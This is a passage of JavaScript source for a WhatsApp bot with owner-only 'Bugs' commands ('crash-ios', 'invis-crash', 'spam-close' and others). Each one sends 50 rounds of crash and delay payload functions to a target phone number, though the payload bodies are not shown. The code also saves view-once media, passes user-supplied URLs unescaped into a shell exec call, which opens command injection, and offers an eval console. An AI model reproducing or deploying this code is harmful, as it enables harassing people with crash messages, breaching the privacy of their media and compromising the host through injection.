  })
  news.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}

        break;
case 'self':
case 'private': {
if (!isCreator) return Reply("only For my Owner");

news.public = false;

Reply('Succesfuly changed To self 🤧')
}

break;
case 'out':
case 'public': {
if (!isCreator) return Reply("Only For my owner Only");

news.public = true;

Reply("Successful Changed To Public")
}
break

case "vv": {
  if (!m.quoted) return Reply("Reply to a View Once message");
  
  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];
  
  if (!msg[type].viewOnce) return m.reply("The message is not View Once!");

  let media = await downloadContentFromMessage(
    msg[type],
    type == 'imageMessage' ? 'image' :
    type == 'videoMessage' ? 'video' : 'audio'
  );

  let buffer = Buffer.from([]);
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk]);
  }

  if (/video/.test(type)) {
    return ambass.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" }, { quoted: lol });
  } else if (/image/.test(type)) {
    return ambass.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" }, { quoted: lol });
  } else if (/audio/.test(type)) {
    return ambass.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: lol });
  }
}
break;

case 'sticker': {
  if (!quoted) return ReplyMulti(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await ambass.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyMulti('max 10s');
    
    let media = await quoted.download();
    let encmedia = await ambass.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyMulti(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}

break

case 'delete':
case 'del': {
    if (!isCreator && !isAdmins) return Reply("O͜͡n͜͡l͜͡y͜͡ F͜͡o͜͡r͜͡ m͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ A͜͡n͜͡d͜͡ F͜͡o͜͡r͜͡ G͜͡r͜͡o͜͡u͜͡p͜͡ A͜͡d͜͡m͜͡i͜͡n͜͡");
    if (!m.quoted) throw false;
    let { chat, id } = m.quoted;
    news.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });
}
      break
      
case "getaudiovid": {
    if (!text) return Reply("⚠️ No video file found to convert.");

    try {
        const videoPath = text;
        const audioPath = path.join(__dirname, `temp_${Date.now()}_converted.mp3`);

        await new Promise((resolve, reject) => {
            ffmpeg(videoPath)
                .noVideo()
                .audioCodec("libmp3lame")
                .save(audioPath)
                .on("end", resolve)
                .on("error", reject);
        });

        await news.sendMessage(
            m.chat,
            { audio: fs.readFileSync(audioPath), mimetype: "audio/mpeg", fileName: `converted_audio.mp3` },
            { quoted: lol }
        );

        fs.unlinkSync(audioPath);
        fs.unlinkSync(videoPath); // remove video after conversion
        await news.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (err) {
        console.error(err);
        Reply("❌ Failed to convert video to audio.");
        await news.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
}

break

case 'download': {
    if (!q) return Reply("❌ Please provide a video URL.\nExample: download https://youtu.be/abc123");

    Reply("⏳ Fetching video details...");

    const { exec } = require("child_process");
    const path = "./temp_video.mp4";
    const infoPath = "./temp_info.json";

    // Command to download both info.json and video
    const cmd = `yt-dlp --write-info-json --no-check-certificate -o "${path}" "${q}"`;

    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            console.error(err);
            return Reply("❌ Could not download video.\nError: " + err.message);
        }

        const fs = require("fs");

        // Find the actual JSON file name
        let jsonFile = null;
        try {
            jsonFile = fs.readdirSync("./").find(f => f.endsWith(".info.json"));
        } catch (e) {
            return Reply("❌ Could not read video information file.");
        }

        if (!jsonFile) return Reply("❌ No video information found.");

        // Read and parse JSON info
        let info;
        try {
            info = JSON.parse(fs.readFileSync(jsonFile));
        } catch (e) {
            return Reply("❌ Failed to parse video info.");
        }

        const title = info.title || "Untitled";
        const uploader = info.uploader || "Unknown";
        const duration = info.duration ? `${Math.floor(info.duration/60)}m ${info.duration%60}s` : "Unknown";
        const views = info.view_count ? info.view_count.toLocaleString() : "Unknown";

        const caption = `🎬 *${title}*\n📺 Uploader: ${uploader}\n⏱ Duration: ${duration}\n👀 Views: ${views}`;

        // Send video with details
        news.sendMessage(from, { video: { url: path }, caption: caption }, { quoted: msg })
            .then(() => {
                // Cleanup
                fs.unlinkSync(path);
                fs.unlinkSync(jsonFile);
            })
            .catch(err => {
                console.error(err);
                Reply("❌ Failed to send video.");
            });
    });
}
break

// ========== [ 📂 Group Function CASE 📂 ] ========= //
     
case 'promote': {
if (!m.isGroup) return Reply("Only On Group Chat")
if (!isAdmins) return Reply("only Admin")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await news.groupParticipantsUpdate(m.chat, [users], 'promote')
await Reply("Successful")
}

break
case 'kick': {
    if (!m.isGroup) return Reply("❌ This command can only be used in group chats.");
    if (!isAdmins && !isCreator) return Reply("❌ Only admins can use this command.");
    // Get target user
    let target;
    if (m.mentionedJid.length > 0) {
        target = m.mentionedJid[0];
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else if (text) {
        target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return Reply("❌ Please mention, quote, or type the number of the user you want to kick.");
    }

    // Kick the user
    try {
        await news.groupParticipantsUpdate(m.chat, [target], 'remove');

        // Send confirmation with add-back button
        await news.sendMessage(m.chat, {
            text: `✅ @${target.split('@')[0]} has been removed from the group.`,
            mentions: [target],
            buttons: [
                {
                    buttonId: `.add ${target.split('@')[0]}`,
                    buttonText: { displayText: "➕ Add Back" },
                    type: 1
                }
            ],
            footer: "Tutorial Bot"
        }, { quoted: m });

    } catch (e) {
        Reply("❌ Failed to remove user. They might have left already or I lack permission.");
    }
}
break;

// ========== [ 📂 Bugs CASE 📂 ] ========= //

case 'crash-ios': {
if (!isCreator) return Reply("only For my Owner");
if (!q) return Reply(`Example : ${prefix + command} 234×××`);
    // Process number
let targets = q.replace(/[^0-9]/g, "");
if (targets.startsWith('0')) 
 return Reply(`Example : ${prefix + command} 234×××`);
 let target = targets + "@s.whatsapp.net";
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${target}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await BlackHexDelayNew(target);
await BlankNew(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
   
// Gc directly dm bug same with dm private bug
break;

case 'delay': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await BoySircle(target);
await BlackHexDelayNew(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

case 'invis-crash': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await FcUiFlows(target);
await protocolbug9(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

case 'spam-close': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await protocolbug9(target);
await VisibleNullRemake(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

case 'host-delay': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await SystemUi(target);
await Warlock(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await Reply(evaled);
} catch (err) {
Reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await Reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});